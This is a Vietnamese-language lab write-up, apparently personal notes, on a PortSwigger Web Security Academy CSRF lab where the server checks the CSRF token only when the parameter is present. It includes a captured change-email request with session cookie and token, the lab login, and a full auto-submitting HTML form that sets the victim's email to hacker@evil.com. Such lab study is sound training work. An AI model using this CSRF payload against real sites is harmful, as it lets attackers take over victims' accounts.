![[Pasted image 20260927000016.png]]
- [ ] Khai thác lỗ hổng CSRF để thay đổi địa chỉ email của người dùng (victim/viewer).

- [ ] Chức năng đổi email bị dính lỗi CSRF.
- [ ] Lỗi logic của server: Chỉ kiểm tra CSRF token nếu tham số đó tồn tại. Nếu tham số bị xóa hoàn toàn, server sẽ bỏ qua bước kiểm tra.
- [ ] Sử dụng Exploit Server của PortSwigger để host trang HTML chứa payload.
- [ ] Tài khoản đăng nhập để test: wiener / peter.
- [ ] Tạo một trang HTML thực hiện cuộc tấn công CSRF.
- [ ] Gửi trang HTML này đến nạn nhân (Deliver exploit to victim).

> [!NOTE]
> POST /my-account/change-email HTTP/2
> Host: 0a60007004de65a48274792200380099.web-security-academy.net
> Cookie: session=EEKZSwau1MaCIvuqlrreYTfvOIRuz1iJ
> Content-Length: 63
> Cache-Control: max-age=0
> Sec-Ch-Ua: "Chromium";v="151", "Not=A?Brand";v="99"
> Sec-Ch-Ua-Mobile: ?0
> Sec-Ch-Ua-Platform: "Linux"
> Accept-Language: en-US,en;q=0.9
> Upgrade-Insecure-Requests: 1
> Content-Type: application/x-www-form-urlencoded
> User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36
> Origin: https://0a60007004de65a48274792200380099.web-security-academy.net
> Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
> Sec-Fetch-Site: same-origin
> Sec-Fetch-Mode: navigate
> Sec-Fetch-User: ?1
> Sec-Fetch-Dest: document
> Referer: https://0a60007004de65a48274792200380099.web-security-academy.net/my-account?id=wiener
> Accept-Encoding: gzip, deflate, br
> Priority: u=0, i
> 
> email=skibidi%40gmail.com&csrf=QBeoIBhWEiEfAntmwBpwwcDOxJYWfUpt

-> cái này found-> ok 
![[Pasted image 20260927000701.png]]
-> payload là gửi cái thằng fake request này trên 1 trang exploit website thôi
```html
<html>
  <body>
    <form action="https://0a60007004de65a48274792200380099.web-security-academy.net/my-account/change-email" method="POST">
        <input type="hidden" name="email" value="hacker@evil.com">
    </form>
    <script>
        document.forms[0].submit();
    </script>
  </body>
</html>
```
![[Pasted image 20260927001739.png]]
